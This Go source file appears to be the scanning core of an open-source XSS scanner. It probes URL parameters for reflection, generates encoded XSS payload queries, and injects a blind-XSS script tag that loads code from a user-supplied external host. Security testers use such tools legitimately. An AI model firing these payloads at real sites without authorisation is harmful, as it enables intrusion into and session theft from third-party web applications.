package scanning

import (
	"bytes"
	"errors"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/briandowns/spinner"
	"github.com/hahwul/dalfox/pkg/optimization"
	"github.com/hahwul/dalfox/pkg/printing"
	"github.com/hahwul/dalfox/pkg/verification"
)

// Scan is main scanning function
func Scan(target string, optionsStr map[string]string, optionsBool map[string]bool) {
	printing.DalLog("SYSTEM", "Target URL: "+target, optionsStr)
	//var params []string

	// query is XSS payloads
	query := make(map[string]map[string]string)

	// params is "param name":true  (reflected?)
	// 1: non-reflected , 2: reflected , 3: reflected-with-sc
	params := make(map[string][]string)

	vStatus := make(map[string]bool)
	vStatus["pleasedonthaveanamelikethis_plz_plz"] = false

	// policy is "CSP":domain..
	policy := make(map[string]string)

	_, err := url.Parse(target)
	if err != nil {
		printing.DalLog("SYSTEM", "Not running "+target+" url", optionsStr)
		return
	}

	/*
		treq, terr := http.NewRequest("GET", target, nil)
		if terr != nil {
		} else {
			client := &http.Client{}
			_, err := client.Do(treq)
			if err != nil {
				printing.DalLog("SYSTEM", "Not running "+target+" url")
				fmt.Println(err)
				return
			} else {
				printing.DalLog("SYSTEM", "Vaild this url")
			}
		}*/

	var wait sync.WaitGroup
	task := 2
	wait.Add(task)
	go func() {
		defer wait.Done()
		printing.DalLog("SYSTEM", "Start static analysis.. 🔍", optionsStr)
		policy = StaticAnalysis(target, optionsStr)
	}()
	go func() {
		defer wait.Done()
		printing.DalLog("SYSTEM", "Start parameter analysis.. 🔍", optionsStr)
		params = ParameterAnalysis(target, optionsStr)
	}()

	s := spinner.New(spinner.CharSets[7], 100*time.Millisecond) // Build our new spinner
	s.Prefix = " "
	s.Suffix = "  Waiting routines.."
	time.Sleep(1 * time.Second) // Waiting log
	s.Start()                   // Start the spinner
	time.Sleep(3 * time.Second) // Run for some time to simulate work
	wait.Wait()
	s.Stop()
	for k, v := range policy {
		if len(v) != 0 {
			printing.DalLog("INFO", k+" is "+v, optionsStr)
		}
	}

	for k, v := range params {
		if len(v) != 0 {
			code, vv := v[len(v)-1], v[:len(v)-1]
			char := strings.Join(vv, "  ")
			//x, a = a[len(a)-1], a[:len(a)-1]
			printing.DalLog("INFO", "Reflected "+k+" param => "+char, optionsStr)
			printing.DalLog("CODE", code, optionsStr)
		}
	}

	if !optionsBool["only-discovery"] {
		// XSS Scanning

		printing.DalLog("SYSTEM", "Generate XSS payload and optimization.Optimization.. 🛠", optionsStr)
		// optimization.Optimization..

		/*
			k: parama name
			v: pattern [injs, inhtml, ' < > ]
			av: reflected type, valid char
		*/

		// set path base xss

		if policy["Content-Type"] != "application/json" {

			arr := getCommonPayload()
			for _, avv := range arr {
				tq, tm := optimization.MakePathQuery(target, "pleasedonthaveanamelikethis_plz_plz", avv, "inPATH")
				tm["payload"] = ";" + avv
				query[tq] = tm

			}

			// set param base xss
			for k, v := range params {
				vStatus[k] = false
				if (optionsStr["p"] == "") || (optionsStr["p"] == k) {
					chars := GetSpecialChar()
					var badchars []string
					for _, av := range v {
						if indexOf(av, chars) == -1 {
							badchars = append(badchars, av)
						}
					}
					for _, av := range v {
						if strings.Contains(av, "inJS") {
							// inJS XSS
							arr := getInJsPayload()
							for _, avv := range arr {
								if optimization.Optimization(avv, badchars) {
									// Add plain XSS Query
									tq, tm := optimization.MakeRequestQuery(target, k, avv, "inJS")
									query[tq] = tm
									// Add URL Encoded XSS Query
									etq, etm := optimization.MakeURLEncodeRequestQuery(target, k, avv, "inJS")
									query[etq] = etm
									// Add HTML Encoded XSS Query
									htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, k, avv, "inJS")
									query[htq] = htm
								}
							}
						}
						if strings.Contains(av, "inATTR") {
							arr := getAttrPayload()
							for _, avv := range arr {
								if optimization.Optimization(avv, badchars) {
									// Add plain XSS Query
									tq, tm := optimization.MakeRequestQuery(target, k, avv, "inATTR")
									query[tq] = tm
									// Add URL Encoded XSS Query
									etq, etm := optimization.MakeURLEncodeRequestQuery(target, k, avv, "inATTR")
									query[etq] = etm
									// Add HTML Encoded XSS Query
									htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, k, avv, "inATTR")
									query[htq] = htm
								}
							}
						}
						// inHTML XSS
						if strings.Contains(av, "inHTML") {
							/*
								arr := GetTags()
								if optimization.Optimization("<", badchars) {
									for _, avv := range arr {
										tq := optimization.MakeRequestQuery(target, k, "/"+avv+"=1")
										tm := map[string]string{"param": k}
										tm["type"] = "inHTML"
										tm["payload"] = avv
										query[tq] = tm

									}
								}
							*/

							arc := getCommonPayload()
							for _, avv := range arc {
								if optimization.Optimization(avv, badchars) {
									// Add plain XSS Query
									tq, tm := optimization.MakeRequestQuery(target, k, avv, "inHTML")
									query[tq] = tm
									// Add URL encoded XSS Query
									etq, etm := optimization.MakeURLEncodeRequestQuery(target, k, avv, "inHTML")
									query[etq] = etm
									// Add HTML Encoded XSS Query
									htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, k, avv, "inHTML")
									query[htq] = htm
								}
							}
						}
					}
				}
			}
		} else {
			printing.DalLog("SYSTEM", "Type is 'application/json', It does not test except customized payload (custom/blind).", optionsStr)
		}
		// Blind payload
		if optionsStr["blind"] != "" {
			spu, _ := url.Parse(target)
			spd := spu.Query()
			for spk := range spd {
				// Add plain XSS Query
				tq, tm := optimization.MakeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind")
				tm["payload"] = "Blind"
				query[tq] = tm
				// Add URL encoded XSS Query
				etq, etm := optimization.MakeURLEncodeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind")
				etm["payload"] = "Blind"
				query[etq] = etm
				// Add HTML Encoded XSS Query
				htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, spk, "\"'><script src="+optionsStr["blind"]+"></script>", "toBlind")
				htm["payload"] = "Blind"
				query[htq] = htm
			}
			printing.DalLog("SYSTEM", "Added your blind XSS ("+optionsStr["blind"]+")", optionsStr)
		}

		// Custom Payload
		if optionsStr["customPayload"] != "" {
			ff, err := readLinesOrLiteral(optionsStr["customPayload"])
			if err != nil {
				printing.DalLog("SYSTEM", "Custom XSS payload load fail..", optionsStr)
			} else {
				for _, customPayload := range ff {
					spu, _ := url.Parse(target)
					spd := spu.Query()
					for spk := range spd {
						// Add plain XSS Query
						tq, tm := optimization.MakeRequestQuery(target, spk, customPayload, "toHTML")
						query[tq] = tm
						// Add URL encoded XSS Query
						etq, etm := optimization.MakeURLEncodeRequestQuery(target, spk, customPayload, "inHTML")
						query[etq] = etm
						// Add HTML Encoded XSS Query
						htq, htm := optimization.MakeHTMLEncodeRequestQuery(target, spk, customPayload, "inHTML")
						query[htq] = htm
					}
				}
				printing.DalLog("SYSTEM", "Added your "+strconv.Itoa(len(ff))+" custom xss payload", optionsStr)
			}
		}

		printing.DalLog("SYSTEM", "Start XSS Scanning.. with "+strconv.Itoa(len(query))+" queries 🗡", optionsStr)
		s := spinner.New(spinner.CharSets[7], 100*time.Millisecond) // Build our new spinner
		mutex := &sync.Mutex{}
		queryCount := 0
		s.Prefix = " "
		s.Suffix = "  Testing.. (" + strconv.Itoa(queryCount) + " / " + strconv.Itoa(len(query)) + ") reqs"
		s.Start()                   // Start the spinner
		time.Sleep(3 * time.Second) // Run for some time to simulate work
		var wg sync.WaitGroup
		for a, b := range query {
			k := a
			v := b
			wg.Add(1)
			go func() {
				defer wg.Done()
				if vStatus[v["param"]] == false {
					resbody, resp, vds, vrs := SendReq(k, v["payload"], optionsStr)
					_ = resp
					if v["type"] != "inBlind" {
						if v["type"] == "inJS" {
							if vrs {
								mutex.Lock()
								if vStatus[v["param"]] == false {
									code := CodeView(resbody, v["payload"])
									printing.DalLog("VULN", "Reflected Payload in JS: "+v["param"]+"="+v["payload"], optionsStr)
									printing.DalLog("CODE", code, optionsStr)
									printing.DalLog("PRINT", k, optionsStr)
									vStatus[v["param"]] = true
									if optionsStr["found-action"] != "" {
										foundAction(optionsStr)
									}
								}
								mutex.Unlock()
							}
						} else if v["type"] == "inATTR" {
							if vds {
								mutex.Lock()
								if vStatus[v["param"]] == false {
									code := CodeView(resbody, v["payload"])
									printing.DalLog("VULN", "Triggered XSS Payload (found DOM Object): "+v["param"]+"="+v["payload"], optionsStr)
									printing.DalLog("CODE", code, optionsStr)
									printing.DalLog("PRINT", k, optionsStr)
									vStatus[v["param"]] = true
									if optionsStr["found-action"] != "" {
										foundAction(optionsStr)
									}
								}
								mutex.Unlock()
							} else if vrs {
								mutex.Lock()
								if vStatus[v["param"]] == false {
									code := CodeView(resbody, v["payload"])
									printing.DalLog("WEAK", "Reflected Payload in Attribute: "+v["param"]+"="+v["payload"], optionsStr)
									printing.DalLog("CODE", code, optionsStr)
									printing.DalLog("PRINT", k, optionsStr)
									if optionsStr["found-action"] != "" {
										foundAction(optionsStr)
									}
								}
								mutex.Unlock()
							}
						} else {
							if vds {
								mutex.Lock()
								if vStatus[v["param"]] == false {
									code := CodeView(resbody, v["payload"])
									printing.DalLog("VULN", "Triggered XSS Payload (found DOM Object): "+v["param"]+"="+v["payload"], optionsStr)
									printing.DalLog("CODE", code, optionsStr)
									printing.DalLog("PRINT", k, optionsStr)
									vStatus[v["param"]] = true
									if optionsStr["found-action"] != "" {
										foundAction(optionsStr)
									}
								}
								mutex.Unlock()
							} else if vrs {
								mutex.Lock()
								if vStatus[v["param"]] == false {
									code := CodeView(resbody, v["payload"])
									printing.DalLog("WEAK", "Reflected Payload in HTML: "+v["param"]+"="+v["payload"], optionsStr)
									printing.DalLog("CODE", code, optionsStr)
									printing.DalLog("PRINT", k, optionsStr)
									if optionsStr["found-action"] != "" {
										foundAction(optionsStr)
									}
								}
								mutex.Unlock()
							}

						}
					}
				}
				mutex.Lock()
				queryCount = queryCount + 1
				s.Lock()
				s.Suffix = "  Tested (" + strconv.Itoa(queryCount) + " / " + strconv.Itoa(len(query)) + ") quries"
				//s.Suffix = " Waiting routines.. (" + strconv.Itoa(queryCount) + " / " + strconv.Itoa(len(query)) + ") reqs"
				s.Unlock()
				mutex.Unlock()
			}()
		}
		wg.Wait()
		s.Stop()
		/*
			task := 1
			var wg sync.WaitGroup
			wg.Add(task)
			go func() {
				defer wg.Done()
			}()
			wg.Wait()
		*/
		//s.Stop()
	}
	printing.DalLog("SYSTEM", "Finish :D", optionsStr)
}

//CodeView is showing reflected code function
func CodeView(resbody, pattern string) string {
	var code string
	if resbody == "" {
		return ""
	}
	bodyarr := strings.Split(resbody, "\n")
	for bk, bv := range bodyarr {
		if strings.Contains(bv, pattern) {
			max := len(bv)
			if max > 80 {
				index := strings.Index(bv, pattern)
				if index < 20 {
					code = code + strconv.Itoa(bk+1) + " line:  " + bv[:80] + "\n    "
				} else {
					if max < index+60 {
						code = code + strconv.Itoa(bk+1) + " line:  " + bv[index-20:max] + "\n    "
					} else {
						code = code + strconv.Itoa(bk+1) + " line:  " + bv[index-20:index+60] + "\n    "
					}
				}
			} else {
				code = code + strconv.Itoa(bk+1) + " line:  " + bv + "\n    "
			}
		}
	}
	if len(code) > 4 {
		return code[:len(code)-5]
	}
	return code
}

// StaticAnalysis is found information on original req/res
func StaticAnalysis(target string, optionsStr map[string]string) map[string]string {
	policy := make(map[string]string)
	resbody, resp, _, _ := SendReq(target, "", optionsStr)
	_ = resbody
	if resp.Header["Content-Type"] != nil {
		policy["Content-Type"] = resp.Header["Content-Type"][0]
	}
	if resp.Header["Content-Security-Policy"] != nil {
		policy["Content-Security-Policy"] = resp.Header["Content-Security-Policy"][0]
	}
	if resp.Header["X-Frame-Options"] != nil {
		policy["X-Frame-Options"] = resp.Header["X-Frame-Options"][0]
	}

	return policy
}

// ParameterAnalysis is check reflected and mining params
func ParameterAnalysis(target string, optionsStr map[string]string) map[string][]string {
	u, err := url.Parse(target)
	params := make(map[string][]string)
	if err != nil {
		return params
	}
	p, _ := url.ParseQuery(u.RawQuery)
	var wgg sync.WaitGroup
	for kk := range p {
		k := kk
		wgg.Add(1)
		go func() {
			defer wgg.Done()
			if (optionsStr["p"] == "") || (optionsStr["p"] == k) {
				//tempURL := u
				//temp_q := u.Query()
				//temp_q.Set(k, v[0]+"DalFox")
				/*
					data := u.String()
					data = strings.Replace(data, k+"="+v[0], k+"="+v[0]+"DalFox", 1)
					tempURL, _ := url.Parse(data)
					temp_q := tempURL.Query()
					tempURL.RawQuery = temp_q.Encode()
				*/
				tempURL, _ := optimization.MakeRequestQuery(target, k, "DalFox", "PA")
				var code string

				//tempURL.RawQuery = temp_q.Encode()
				resbody, resp, _, vrs := SendReq(tempURL, "DalFox", optionsStr)
				_ = resp
				if vrs {
					code = CodeView(resbody, "DalFox")
					code = code[:len(code)-5]
					pointer := optimization.Abstraction(resbody)
					var smap string
					ih := 0
					ij := 0
					for _, sv := range pointer {
						if sv == "inHTML" {
							ih = ih + 1
						}
						if sv == "inJS" {
							ij = ij + 1
						}
					}
					if ih > 0 {
						smap = smap + "inHTML[" + strconv.Itoa(ih) + "] "
					}
					if ij > 0 {
						smap = smap + "inJS[" + strconv.Itoa(ij) + "] "
					}
					ia := 0
					tempURL, _ := optimization.MakeRequestQuery(target, k, "\" id=dalfox \"", "PA")
					_, _, vds, _ := SendReq(tempURL, "", optionsStr)
					if vds {
						ia = ia + 1
					}
					tempURL, _ = optimization.MakeRequestQuery(target, k, "' id=dalfox '", "PA")
					_, _, vds, _ = SendReq(tempURL, "", optionsStr)
					if vds {
						ia = ia + 1
					}
					tempURL, _ = optimization.MakeRequestQuery(target, k, "' class=dalfox '", "PA")
					_, _, vds, _ = SendReq(tempURL, "", optionsStr)
					if vds {
						ia = ia + 1
					}
					tempURL, _ = optimization.MakeRequestQuery(target, k, "\" class=dalfox \"", "PA")
					_, _, vds, _ = SendReq(tempURL, "", optionsStr)
					if vds {
						ia = ia + 1
					}
					if ia > 0 {
						smap = smap + "inATTR[" + strconv.Itoa(ia) + "] "
					}

					params[k] = append(params[k], smap)
					var wg sync.WaitGroup
					mutex := &sync.Mutex{}
					chars := GetSpecialChar()
					for _, c := range chars {
						wg.Add(1)
						char := c
						/*
							tdata := u.String()
							tdata = strings.Replace(tdata, k+"="+v[0], k+"="+v[0]+"DalFox"+char, 1)
							turl, _ := url.Parse(tdata)
							tq := turl.Query()
							turl.RawQuery = tq.Encode()
						*/

						/* turl := u
						q := u.Query()
						q.Set(k, v[0]+"DalFox"+string(char))
						turl.RawQuery = q.Encode()
						*/
						go func() {
							defer wg.Done()
							turl, _ := optimization.MakeRequestQuery(target, k, "dalfox"+char, "PA")
							_, _, _, vrs := SendReq(turl, "dalfox"+char, optionsStr)
							_ = resp
							if vrs {
								mutex.Lock()
								params[k] = append(params[k], char)
								mutex.Unlock()
							}
						}()
					}
					wg.Wait()
					params[k] = append(params[k], code)
				}
			}
		}()
		wgg.Wait()
	}
	return params
}

// SendReq is sending http request (handled GET/POST)
func SendReq(url, payload string, optionsStr map[string]string) (string, *http.Response, bool, bool) {
	req, _ := http.NewRequest("GET", url, nil)
	if optionsStr["data"] != "" {
		d := []byte(optionsStr["data"])
		req, _ = http.NewRequest("POST", url, bytes.NewBuffer(d))
	}

	if optionsStr["header"] != "" {
		h := strings.Split(optionsStr["header"], ": ")
		if len(h) > 1 {
			req.Header.Add(h[0], h[1])
		}
	}
	if optionsStr["cookie"] != "" {
		req.Header.Add("Cookie", optionsStr["cookie"])
	}
	if optionsStr["ua"] != "" {
		req.Header.Add("User-Agent", optionsStr["ua"])
	} else {
		req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0")
	}

	var netTransport = &http.Transport{
		Dial: (&net.Dialer{
			Timeout: 5 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 5 * time.Second,
	}

	client := &http.Client{
		Timeout:   time.Second * 10,
		Transport: netTransport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return errors.New("something bad happened") // or maybe the error from the request
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", resp, false, false
	}

	bytes, _ := ioutil.ReadAll(resp.Body)
	str := string(bytes)

	defer resp.Body.Close()
	vds := verification.VerifyDOM(str)
	vrs := verification.VerifyReflection(str, payload)
	return str, resp, vds, vrs
}

func indexOf(element string, data []string) int {
	for k, v := range data {
		if element == v {
			return k
		}
	}
	return -1 //not found.
}
